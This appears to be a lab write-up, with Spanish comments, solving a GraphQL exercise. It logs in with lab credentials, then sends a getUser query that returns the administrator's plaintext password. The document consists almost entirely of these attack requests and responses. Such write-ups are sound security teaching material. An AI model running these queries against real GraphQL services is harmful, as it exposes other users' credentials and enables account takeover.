---
title: "2 - Accidental exposure of private GraphQL fields"
---

# 2 - Accidental exposure of private GraphQL fields

request
```json
    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }

{"input":{
	"username":"wiener",
	"password":"peter"
	}
}
```

response
``` json
{
  "data": {
    "login": {
      "token": "PKlPc6qrV9uMQyAcgwLqmGLfrujxFaEo",
      "success": true
    }
  }
}
```

Buscamos y vemos que hay una query que nos permite obtener información del administrador:

```json
query{
	getUser(id: 1) {
			id
			username
			password
	}
}
```

``` json
{"query":"query{\n\tgetUser(id: 1) {\r\n\t\t\tid\n\t\t\tusername\n\t\t\tpassword\r\n\t}\n}"}
```

respuesta:
```json
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "psqgud000ux6d78ttmbq"
    }
  }
}
```
